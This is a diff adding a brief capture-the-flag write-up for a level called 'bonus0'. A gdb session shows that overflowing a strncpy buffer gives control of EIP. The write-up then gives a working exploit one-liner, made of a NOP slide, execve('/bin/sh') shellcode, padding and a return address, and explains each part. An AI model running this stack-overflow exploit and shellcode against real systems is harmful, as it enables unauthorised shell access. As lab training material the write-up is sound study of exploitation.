@@ -1,0 +1,32 @@
+We can see that we control EIP with some basic overflow on the second strncpy.
+
+(gdb) run
+Starting program: /home/user/bonus0/bonus0
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ -
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+
+Since we control EIP we can jump at an adress we want.
+
+(python -c 'print "\x90" * 2096 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\n"'; python -c 'print "B" * 9  + "\x68\xea\xff\xbf" +  "B" *  7 + "\n"'; cat) | ./bonus0
+
+
+So this line is : 
+
+1) \x90 * 2096 is just an NOP slide in to s[4096];
+
+2) Then we add the same shellcode as previous level `execve("/bin/sh")` + "\n"
+to go to next input
+
+2) print "B" * 9 is padding to get the correct offset to ovewrite EIP
+
+3) we redirect EIP to the starting of our buff[4096] + 1000 which will be
+somwhere in the left wing of the buffer.
+
+4) cat to block input
